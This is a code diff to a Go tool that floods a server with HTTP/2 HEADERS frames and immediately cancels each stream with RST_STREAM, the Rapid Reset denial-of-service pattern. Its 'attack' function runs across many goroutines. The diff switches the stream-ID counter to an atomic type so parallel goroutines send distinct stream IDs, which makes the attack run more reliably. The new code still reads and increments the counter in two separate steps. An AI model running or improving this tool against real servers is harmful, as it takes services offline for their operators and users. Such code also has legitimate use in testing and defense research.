@@ -6,6 +6,7 @@ import (
 	"flag"
 	"log"
 	"net/url"
+	"sync/atomic"
 	"time"
 
 	"golang.org/x/net/http2"
@@ -91,11 +92,11 @@ func main() {
 
 		//at this point, the connection is established.
 
-		var streamCounter uint32 = 1 //according to https://datatracker.ietf.org/doc/html/rfc9113#name-stream-identifiers, stream IDs MUST be uneven for client-initiated requests
+		var streamCounter atomic.Uint32 //according to https://datatracker.ietf.org/doc/html/rfc9113#name-stream-identifiers, stream IDs MUST be uneven for client-initiated requests
+		streamCounter.Add(1)
 		for i := 0; i < *routines; i++ {
 			streamFramer := http2.NewFramer(conn, conn) //a framer may only be used by a single reader/writer
-			go attack(streamFramer, serverUrl, *attempts, streamCounter, sleep)
-			streamCounter += 2
+			go attack(streamFramer, serverUrl, *attempts, &streamCounter, sleep)
 		}
 		readFrames(conn)
 		conn.Close()
@@ -123,18 +124,20 @@ func readFrames(conn *tls.Conn) {
 	}
 }
 
-func attack(framer *http2.Framer, url *url.URL, attempts uint, streamCounter uint32, sleepTime *int) {
+func attack(framer *http2.Framer, url *url.URL, attempts uint, streamCounter *atomic.Uint32, sleepTime *int) {
 	for i := uint(0); i < attempts; i++ {
-		err := framer.WriteHeaders(createHeaderFrameParam(url, streamCounter))
+		streamId := streamCounter.Load()
+		streamCounter.Add(2)
+		err := framer.WriteHeaders(createHeaderFrameParam(url, streamId))
 		if err != nil {
 			log.Fatalf("unable to send initial HEADERS frame")
 		}
-		log.Printf("sent initial headers")
+		log.Printf("sent initial headers on stream %d", streamId)
 		
 		log.Printf("now sleeping for %d milliseconds", *sleepTime)
 		time.Sleep(time.Millisecond * time.Duration(*sleepTime))
 
-		err = framer.WriteRSTStream(streamCounter, http2.ErrCodeCancel)
+		err = framer.WriteRSTStream(streamId, http2.ErrCodeCancel)
 		if err != nil {
 			log.Fatalf("unable to write RST_STREAM frame: %v", err)
 		}
